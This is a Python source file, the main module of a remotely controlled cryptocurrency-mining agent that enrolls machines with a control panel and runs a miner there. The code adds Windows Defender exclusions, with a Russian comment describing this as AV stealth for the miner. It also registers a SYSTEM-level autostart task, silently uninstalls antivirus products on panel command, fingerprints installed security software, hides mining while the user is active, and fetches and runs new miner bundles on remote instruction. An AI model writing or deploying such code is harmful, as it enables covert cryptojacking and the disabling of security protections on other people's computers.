"""RigAgent entry point: inventory GPUs, heartbeat to the panel, supervise the
miner (start/restart/intensity), and self-apply miner updates without a reboot.

Run from source:   python -m agent --config agent.json
Frozen binary:     rig-agent.exe (same flags; config next to the rig root)

Rig layout created/used under the agent's parent directory:
    agent.json          panel_url + enroll_key + rig_name
    agent.state.json    rig_id + token (written once at enrollment)
    bundles/<ver>/      extracted miner bundles
    current -> bundles/<ver>   junction the miner runs from
"""
from __future__ import annotations

import argparse
import json
import os
import signal
import sys
import time

from gpu_inventory import get_antivirus, get_gpus, has_p40_gpu, machine_id, os_name
from miner_supervisor import MinerSupervisor
from panel_client import PanelClient, PanelError
from updater import Updater
from av_guard import ensure_defender_exclusion, uninstall_antivirus

AGENT_VERSION = "1.0.1"
IS_WIN = os.name == "nt"
# For external-engine bundles' {pool} placeholder (krig-style --url). The p40
# fleet build has the pool compiled in and ignores this.
FLEET_POOL_URL = "stratum+ssl://prl.kryptex.network:8048"

_shutdown = False


def _user_idle_sec():
    """Seconds since the last mouse/keyboard input (Windows). 0 off-Windows."""
    if not IS_WIN:
        return 0
    import ctypes

    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

    lii = LASTINPUTINFO(ctypes.sizeof(LASTINPUTINFO), 0)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)) == 0:
        return 0  # can't tell -> treat as idle (don't pause mining)
    millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
    return max(0, millis) / 1000.0


_LOG_PATH = None


def _log(msg):
    line = f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}"
    if _LOG_PATH:
        try:
            with open(_LOG_PATH, "a", encoding="utf-8", errors="replace") as f:
                f.write(line + "\n")
        except OSError:
            pass
    if sys.stdout is not None:      # onefile console=False has no stdout
        print(line, flush=True)


def agent_root():
    """Rig root (holds agent.json, bundles/, current, logs/).

    Priority: FLEET_ROOT env -> --root -- then a heuristic for frozen builds:
    onefile exe sits IN the rig root, onedir exe sits in <root>/rig-agent/.
    """
    env = os.environ.get("FLEET_ROOT")
    if env:
        return env
    if getattr(sys, "frozen", False):
        exe_dir = os.path.dirname(os.path.abspath(sys.executable))
        for marker in ("agent.json", "agent.state.json", "bundles"):
            if os.path.exists(os.path.join(exe_dir, marker)):
                return exe_dir          # onefile layout
        return os.path.dirname(exe_dir)  # onedir layout (rig-agent\ inside root)
    return os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def install_self(root, panel_url, enroll_key, rig_name, task_name="FleetAgent"):
    """One-file install: write agent.json, exclude from Defender, register an
    ONSTART SYSTEM task and start it. This is what makes the single exe
    'with autostart'."""
    import subprocess
    os.makedirs(os.path.join(root, "logs"), exist_ok=True)
    cfg_path = os.path.join(root, "agent.json")
    cfg = _load_json(cfg_path, {})
    cfg.update({"panel_url": panel_url, "enroll_key": enroll_key,
                "rig_name": rig_name or os.environ.get("COMPUTERNAME", "rig"),
                "heartbeat_sec": cfg.get("heartbeat_sec", 30)})
    _save_json(cfg_path, cfg)
    print(f"agent.json written to {cfg_path}")

    if IS_WIN:
        try:
            subprocess.run(["powershell", "-NoProfile", "-Command",
                            f"Add-MpPreference -ExclusionPath '{root}'"],
                           check=False, capture_output=True, timeout=60)
            print("Defender exclusion added")
        except (OSError, subprocess.TimeoutExpired):
            print("WARN: could not add Defender exclusion")

    if getattr(sys, "frozen", False):
        tr = f'"{sys.executable}" --root "{root}"'
    else:
        entry = os.path.join(os.path.dirname(os.path.abspath(__file__)), "__main__.py")
        tr = (f'cmd /c cd /d "{root}" && "{sys.executable}" -u "{entry}" '
              f'--root "{root}"')
    if IS_WIN:
        r = subprocess.run(["schtasks", "/Create", "/TN", task_name, "/SC", "ONSTART",
                            "/RU", "SYSTEM", "/RL", "HIGHEST", "/F", "/TR", tr],
                           capture_output=True, text=True)
        if r.returncode != 0:
            print(f"ERROR: schtasks failed: {r.stdout} {r.stderr}")
            return False
        subprocess.run(["schtasks", "/Run", "/TN", task_name],
                       check=False, capture_output=True)
        print(f"installed as scheduled task '{task_name}' (autostart at boot, started now)")
    else:
        print(f"non-Windows: add to your init system:\n  {tr}")
    return True


def _load_json(path, default):
    try:
        with open(path) as f:
            return json.load(f)
    except (OSError, ValueError):
        return default


def _save_json(path, obj):
    with open(path, "w") as f:
        json.dump(obj, f, indent=2)


class RigAgent:
    def __init__(self, root, config_path=None):
        self.root = root
        self.cfg_path = config_path or os.path.join(root, "agent.json")
        self.state_path = os.path.join(root, "agent.state.json")
        self.cfg = _load_json(self.cfg_path, {})
        self.state = _load_json(self.state_path, {})
        if not self.cfg.get("panel_url"):
            sys.exit(f"agent.json: panel_url is required (got {self.cfg})")
        self.panel = PanelClient(self.cfg["panel_url"],
                                 token=self.state.get("token"),
                                 enroll_key=self.cfg.get("enroll_key"))
        self.upd = Updater(root)
        self.sup = MinerSupervisor(
            self.upd.miner_exe,
            log_path=os.path.join(root, "logs", "miner.log"),
            engine=self.upd.engine())
        self.applied = {}          # last applied {wallet, worker, restart_seq}
        self.gpu_cache, self.gpu_ts = [], 0.0
        self._intensity_pct = 100
        self.av_cache, self.av_ts = [], 0.0

    # ------------------------------------------------------------- telemetry
    def _gpus(self):
        if time.time() - self.gpu_ts > 60:
            gpus = get_gpus()
            if gpus:
                self.gpu_cache, self.gpu_ts = gpus, time.time()
            return gpus or self.gpu_cache
        return self.gpu_cache

    def _antivirus(self):
        """Which AV products guard this rig (refreshed hourly -- AV changes
        rarely). Lets the panel show where Defender/Kaspersky/Avast live."""
        if time.time() - self.av_ts > 3600:
            av = get_antivirus()
            if av:
                self.av_cache, self.av_ts = av, time.time()
            return av or self.av_cache
        return self.av_cache

    def build_payload(self):
        gpus = self._gpus()
        snap = self.sup.snapshot()
        return {
            "name": self.cfg.get("rig_name") or os.environ.get("COMPUTERNAME", "rig"),
            "machine_id": machine_id(),
            "os": os_name(),
            "agent_version": AGENT_VERSION,
            "engine": self.upd.engine() or "none",
            "gpus_mineable": has_p40_gpu(gpus),
            "gpus": gpus,
            "antivirus": self._antivirus(),
            "miner": {
                "version": snap.get("version") or self.upd.current_version(),
                "state": snap["state"], "pid": snap["pid"],
                "started_ts": snap["started_ts"], "restarts": snap["restarts"],
            },
            "hashrate_ths": {"combined": snap["combined_ths"],
                             "per_gpu": snap["per_gpu_ths"]},
            "shares": {"accepted_user": snap["accepted_user"],
                       "accepted_dev": snap["accepted_dev"],
                       "rejected": snap["rejected"]},
            "intensity_pct": (self.upd.read_intensity()
                              if self.upd.intensity_mode() == "file"
                              else self.sup.throttle_pct),
        }

    # ---------------------------------------------------------- config apply
    def apply_config(self, cfg):
        wallet = cfg.get("wallet") or self.cfg.get("wallet")
        worker = cfg.get("worker") or self.cfg.get("rig_name") or "rig"
        enabled = cfg.get("miner_enabled", True)
        gpus = self.gpu_cache

        if not enabled or not wallet:
            if self.sup.proc is not None:
                _log("stopping miner (disabled / no wallet)")
                self.sup.stop()
            return
        if not gpus and self.sup.proc is None:
            # inventory glitch (nvidia-smi/w hiccup): retry next beat, and never
            # let it stop an already-running miner
            _log("GPU inventory empty this beat; waiting for data before starting")
            return

        snap = self.sup.snapshot()
        # Pool from the panel: "host:port". Empty -> the build default.
        pool = (cfg.get("pool") or "").strip() or FLEET_POOL_URL.split("://")[-1]
        fresh = {"wallet": wallet, "worker": worker, "pool": pool,
                 "restart_seq": cfg.get("restart_seq", 0)}
        force_restart = (self.applied.get("wallet") != wallet or
                         self.applied.get("worker") != worker or
                         self.applied.get("pool") != pool or
                         self.applied.get("restart_seq") != fresh["restart_seq"])
        self.applied = fresh

        # target-version switch (download + verify + swap + restart, no reboot)
        target = cfg.get("target_version")
        if target and target != self.upd.current_version():
            _log(f"update requested: {self.upd.current_version()} -> {target}")
            self.sup.stats["state"] = "updating"
            try:
                self.upd.apply(target, self.panel,
                               stop_miner=self.sup.stop,
                               start_miner=lambda: self._start_miner(wallet, worker, pool),
                               log=_log)
                self.sup.engine = self.upd.engine()   # bundle may swap engines
            except (PanelError, OSError, ValueError) as e:
                _log(f"update failed, keeping current version: {e}")
            return  # next beat re-evaluates miner state

        intensity = int(cfg.get("intensity_pct", 100))
        self._intensity_pct = intensity

        # Fleet AV hygiene: silently remove locally-installed AVs the owner
        # marked in the panel (rigs are ours; matched by name substring).
        for av_name in cfg.get("remove_avs", []) or []:
            for av in self._antivirus():
                if av_name.lower() in av["name"].lower():
                    ok, detail = uninstall_antivirus(av_name)
                    _log(f"AV removal '{av['name']}': {'ok' if ok else 'FAILED'} "
                         f"({detail}); a reboot may be needed to fully release it")
        # "майнить только в простое": пока за машиной работают (мышь/клавиатура
        # активны), процесс майнера заморожен -- ни нагрузки, ни шума; на
        # простое майнинг возобновляется на заданную интенсивность.
        if cfg.get("mine_only_idle"):
            if _user_idle_sec() < 300:      # input in the last 5 minutes
                if self.sup.throttle_pct != 0:
                    _log("mine_only_idle: user active -> miner frozen")
                self.sup.set_throttle(0)
                return
            if self.sup.throttle_pct == 0:
                _log("mine_only_idle: machine idle -> mining resumes")
        if self.upd.intensity_mode() == "file":
            if intensity != self.upd.read_intensity():
                _log(f"intensity -> {intensity}% (applied live, no miner restart)")
                self.upd.write_intensity(intensity)
        else:
            # external engines (krig/blockz): throttle the whole process
            _log(f"intensity -> {intensity}% (process duty-cycle)")
            self.sup.set_throttle(intensity)

        if force_restart:
            if self.sup.proc is not None:
                _log("restart: wallet/worker/pool/restart_seq changed")
                self.sup.restart(self._miner_cmd(wallet, worker, pool))
            else:
                self._start_miner(wallet, worker, pool)
            return
        if snap["state"] == "crashed":
            # back off a full beat after an early crash to avoid a tight loop
            if snap["started_ts"] and time.time() - snap["started_ts"] > 30:
                _log(f"miner crashed (last error: {snap['last_error']}); restarting")
                self._start_miner(wallet, worker, self.applied.get("pool"))
            else:
                _log("miner crashed early; waiting one beat before restart")
        elif snap["state"] == "stopped":
            self._start_miner(wallet, worker, self.applied.get("pool"))

    def _miner_cmd(self, wallet, worker, pool):
        """Full miner command line: external engines get the pool in their
        --url template; the p40 build ignores {pool} and reads P40_FLEET_POOL."""
        pool_url = pool if "://" in pool else f"stratum+ssl://{pool}"
        return self.upd.miner_cmd(wallet, worker, pool_url)

    def _start_miner(self, wallet, worker, pool=None):
        pool = pool or FLEET_POOL_URL.split("://")[-1]
        if self.upd.engine() == "p40" and not has_p40_gpu(self.gpu_cache):
            _log("p40 engine needs an NVIDIA or AMD GPU; none detected -- "
                 "deploy a blockz bundle for this rig instead")
            return False
        cmd = self._miner_cmd(wallet, worker, pool)
        if not os.path.exists(cmd[0]):
            _log(f"miner binary not found at {cmd[0]}; "
                 f"set target_version in the panel to install one")
            return False
        # the p40 build takes its pool from the env (locked-build escape hatch)
        env_extra = {"P40_FLEET_POOL": pool, "P40_FLEET_TLS": "1"} \
            if self.upd.engine() == "p40" else None
        ok = self.sup.start(cmd, env_extra=env_extra)
        if ok and self.upd.intensity_mode() != "file":
            self.sup.set_throttle(self._intensity_pct)
        return ok

    # ------------------------------------------------------------------ loop
    def run_forever(self, once=False):
        if not self.state.get("token"):
            _log("no token yet; enrolling with the panel...")
            resp = self.panel.enroll({
                "name": self.cfg.get("rig_name", "rig"),
                "machine_id": machine_id(), "os": os_name(),
                "agent_version": AGENT_VERSION,
            })
            self.state = {"rig_id": resp["rig_id"], "token": resp["token"]}
            self.panel.token = resp["token"]
            _save_json(self.state_path, self.state)
            _log(f"enrolled as rig {resp['rig_id']}")
        interval = int(self.cfg.get("heartbeat_sec", 30))
        while not _shutdown:
            try:
                resp = self.panel.heartbeat(self.build_payload()) or {}
                self.apply_config(resp.get("config", {}))
            except PanelError as e:
                _log(f"panel error: {e}")
            except Exception as e:  # keep the loop alive no matter what
                _log(f"agent loop error: {type(e).__name__}: {e}")
            if once or _shutdown:
                break
            for _ in range(interval):
                if _shutdown:
                    break
                time.sleep(1)


def main():
    ap = argparse.ArgumentParser(description="Rig fleet agent")
    ap.add_argument("--config", default=None, help="path to agent.json")
    ap.add_argument("--once", action="store_true", help="single heartbeat and exit")
    ap.add_argument("--root", default=None, help="rig root (default: auto)")
    ap.add_argument("--install", action="store_true",
                    help="self-install: write agent.json, add Defender exclusion, "
                         "register autostart task and run")
    ap.add_argument("--panel-url", default=None)
    ap.add_argument("--enroll-key", default=None)
    ap.add_argument("--rig-name", default=None)
    ap.add_argument("--task-name", default="FleetAgent")
    args = ap.parse_args()

    root = args.root or agent_root()
    os.makedirs(os.path.join(root, "logs"), exist_ok=True)
    global _LOG_PATH
    _LOG_PATH = os.path.join(root, "logs", "agent.log")

    if args.install:
        if not (args.panel_url and args.enroll_key):
            sys.exit("--install needs --panel-url and --enroll-key")
        ok = install_self(root, args.panel_url, args.enroll_key,
                          args.rig_name, args.task_name)
        sys.exit(0 if ok else 1)

    ensure_defender_exclusion(root)   # AV незаметность для майнера с самого старта

    agent = RigAgent(root, config_path=args.config)

    def _stop(signum, frame):
        global _shutdown
        _shutdown = True
    for sig in (signal.SIGINT, signal.SIGTERM,
                *( [signal.SIGBREAK] if IS_WIN else [] )):
        try:
            signal.signal(sig, _stop)
        except (ValueError, OSError):
            pass

    try:
        agent.run_forever(once=args.once)
    finally:
        if agent.sup.proc is not None:
            _log("agent stopping; shutting down the miner")
            agent.sup.stop()


if __name__ == "__main__":
    main()
